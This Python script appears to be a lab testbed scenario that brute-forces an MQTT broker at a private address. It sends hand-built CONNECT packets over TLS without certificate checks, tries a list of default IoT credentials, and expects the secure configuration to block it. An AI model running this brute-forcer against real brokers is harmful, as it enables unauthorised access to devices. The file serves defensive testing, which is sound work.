#!/usr/bin/env python3
"""
SCENARIO 4 - Brute Force (SECURE environment)
Expected result: FAILS - Auth required, no valid credentials in payload
"""
import socket, time, ssl, json, os
from datetime import datetime, timezone

BROKER_HOST = "172.21.0.20"
BROKER_PORT = 8883
OUTPUT_DIR  = "/attacker/results"
OUTPUT_FILE = f"{OUTPUT_DIR}/04_bruteforce_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

os.makedirs(OUTPUT_DIR, exist_ok=True)

CREDENTIALS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
    ("admin", "1234"), ("root", "root"), ("root", "password"),
    ("guest", "guest"), ("mqtt", "mqtt"), ("iot", "iot"),
    ("device", "device"), ("sensor", "sensor"), ("", ""),
]

# Credentials that would have been harvested from eavesdropping
# In secure env, eavesdropping fails so no credentials harvested
HARVESTED = []

def log(msg):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)

def try_connect(username, password):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        start = time.time()
        s = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=5)
        s = ctx.wrap_socket(s)

        client_id = b"attacker-bf"
        user_b = username.encode()
        pass_b = password.encode()

        flags = 0xC2  # username + password flags
        payload = (b"\x00\x04MQTT\x04" + bytes([flags]) + b"\x00\x3c" +
                   bytes([0, len(client_id)]) + client_id +
                   bytes([0, len(user_b)]) + user_b +
                   bytes([0, len(pass_b)]) + pass_b)
        header = bytes([0x10, len(payload)])
        s.send(header + payload)

        data = s.recv(4)
        latency = round((time.time() - start) * 1000, 2)
        s.close()

        if len(data) >= 4 and data[3] == 0:
            return True, latency
        return False, latency
    except Exception as e:
        return False, -1

print("=" * 50)
print(" SCENARIO 4 - Brute Force (SECURE)")
print("=" * 50)
print(f" Target broker    : {BROKER_HOST}:{BROKER_PORT}")
print(f" Dictionary size  : {len(CREDENTIALS)} pairs")
print(f" Harvested creds  : {len(HARVESTED)} (none - eavesdropping failed)")
print(f" Expected         : FAIL - No valid credentials found")
print("=" * 50)

log("[*] Phase 1: Dictionary attack with common IoT credentials")
log(f"[*] Testing {len(CREDENTIALS)} credential pairs...")
log("")

success = []
for i, (user, pwd) in enumerate(CREDENTIALS, 1):
    ok, latency = try_connect(user, pwd)
    display_user = user if user else "(empty)"
    display_pass = pwd if pwd else "(empty)"
    if ok:
        log(f"[+] SUCCESS [{i:3d}] {display_user}:{display_pass} — latency: {latency}ms")
        success.append((user, pwd))
    else:
        log(f"[-] FAILED  [{i:3d}] {display_user}:{display_pass} — latency: {latency}ms")
    time.sleep(1)

log("")
log(f"[*] Dictionary attack complete: {len(CREDENTIALS)} attempts")
log(f"[*] Successful authentications: {len(success)}")

log("")
log("[*] Phase 2: Credential reuse attack")
log("[*] No credentials harvested (eavesdropping blocked by TLS)")
log("[!] Credential reuse attack not possible in secure environment")

results = {
    "timestamp": datetime.now(timezone.utc).isoformat(),
    "dictionary_attempts": len(CREDENTIALS),
    "dictionary_success": len(success),
    "reuse_attempts": len(HARVESTED),
    "reuse_success": 0,
    "successful_credentials": success
}

with open(OUTPUT_FILE, "w") as f:
    json.dump(results, f, indent=2)

print("")
print("=" * 50)
print(" ATTACK SUMMARY - Scenario 4 (SECURE)")
print("=" * 50)
print(f" Dictionary success : {len(success)}/{len(CREDENTIALS)}")
print(f" Reuse success      : 0/0 (no harvested creds)")
print(f" Result             : {'ATTACK SUCCEEDED' if success else 'ATTACK BLOCKED'}")
print(f" Output saved to    : {OUTPUT_FILE}")
print("=" * 50)
